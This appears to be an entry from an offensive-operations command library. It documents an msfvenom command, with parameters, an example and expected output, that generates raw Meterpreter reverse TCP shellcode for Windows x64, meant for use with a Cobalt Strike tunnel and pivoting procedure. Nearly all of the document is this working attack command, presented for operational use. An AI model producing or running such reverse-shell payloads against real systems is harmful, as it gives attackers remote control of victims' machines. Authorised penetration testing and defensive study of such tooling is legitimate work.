---
id: new-uuid-for-msf
name: metasploit-generate-reverse-tcp-payload
type: command
executor: bash
data: >-
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=$_LPORT
  -f raw -o $_PAYLOAD_PATH
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload
  - generation
verified: true
validated: true
---

# metasploit-generate-reverse-tcp-payload

## Command

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=$_LPORT -f raw -o $_PAYLOAD_PATH
```

## Description

Generates a raw Meterpreter reverse TCP shellcode payload for use with Cobalt Strike spunnel, targeting Windows x64.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LPORT | Local port for reverse connection | Yes |
| $_PAYLOAD_PATH | Output file path (e.g., /tmp/msf.bin) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
```

## Expected Output

"Generated payload saved to /tmp/msf.bin". File created; use `ls -l` to verify.

## Related

- [[procedures/Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike]]
- [[tools/Metasploit]]
